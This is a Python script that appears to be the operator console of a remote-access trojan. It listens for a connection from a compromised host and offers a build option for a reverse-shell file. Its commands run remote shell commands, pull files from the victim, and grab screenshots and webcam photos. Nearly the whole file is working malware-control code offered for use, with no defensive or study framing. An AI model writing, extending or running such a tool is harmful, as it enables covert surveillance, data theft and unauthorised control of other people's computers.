from rich.console import Console
from rich.panel import Panel
from rich import box
from getpass import getpass
from os import system, path
import argparse
import pyhm

console = Console()

logo = '''______ ___ ___ _______ _______ _______ _______ _______ 
|   __ \   |   |   |   |       |       |   |   |   _   |
|    __/\     /|       |   -   |   -   |       |       |
               |___|    |___| |___|___|_______|_______|__|_|__|___|___| by blueTUZZ_01'''

parser = argparse.ArgumentParser()
parser.add_argument('-p', '--port', default=5555, help='SPECIFIED PORT')
parser.add_argument('-b', '--build', action='store_true', help='BUILD REVERSE SHELL FILE')
parser.add_argument('-l', '--log', action='store_true', help='ON LOG MODE')
args = parser.parse_args()

if args.build:
	pyhm.buildReverse()

else:
	coms = open('commands.txt', 'r')
	commands = coms.read()
	coms.close()

	system('cls')
	console.print(f'[red]{logo}[/]', justify='center')
	console.print(f'[italic magenta](*)[/]Listening on port: {args.port}')

	conn, addr = pyhm.openConnection(int(args.port))


	console.print('[italic magenta](*)[/]Successfully connected')
	console.print(f'PORT: [italic magenta]{addr[1]}[/] \nIP: [italic magenta]{addr[0]}[/]\nPRESS ENTER TO CONTINUE')
	getpass(prompt='', stream=None)

	console.print(Panel.fit(commands, style='yellow', title='COMMANDS', box=box.ASCII))

	while True:
			execute = console.input('[bold green]{$}>>[/]')
			conn.send(bytes(execute, encoding='utf-8'))

			if execute[0:8] == 'download'.lower():
				fileData = conn.recv(4096).decode()
				filename = conn.recv(4096).decode()

				if path.exists(filename):
						console.print('[italic magenta](!)[/]File is already exist!')
				else:
					try:
						downFile = open(f'Downloads\\{filename}', 'w')
						downFile.write(fileData)
						downFile.close()

					except:
						console.print('[italic magenta](x)[/]Download error', style='red')
					else:
						console.print('[italic magenta](✓)[/]Successfully downloaded', style='green')

			elif execute[0:5] == 'shell':
				data = conn.recv(4096).decode()
				console.print(Panel.fit(data, style='italic cyan', title='Response:', title_align='left', box=box.DOUBLE))

				if args.log:
					log = open('log.txt', 'a')
					log.write(data)
					log.close()

				data = ''

			elif execute == 'screenshot'.lower():
				screen = conn.recv(1000000)

				save = open('Photo\\screenshot.png', 'wb')
				save.write(screen)
				save.close()

				console.print('[italic magenta](✓)[/]Screenshot taked', style='green')


			elif execute == 'photo'.lower():
				photo = conn.recv(1000000)

				save = open('Photo\\webcam.png', 'wb')
				save.write(photo)
				save.close()

				console.print('[italic magenta](✓)[/]Photo taked', style='green')

				


			elif execute == 'disconnect'.lower():
				console.print('[italic magenta](!)[/]disconnected', style='yellow')
				break
			elif execute == 'disconnect_&_delete'.lower():
				try:
					pass
				except:
					console.print('[italic magenta](!)[/]disconnected', style='yellow')

			else:
				console.print('[italic magenta](x)[/]Unknown command', style='red')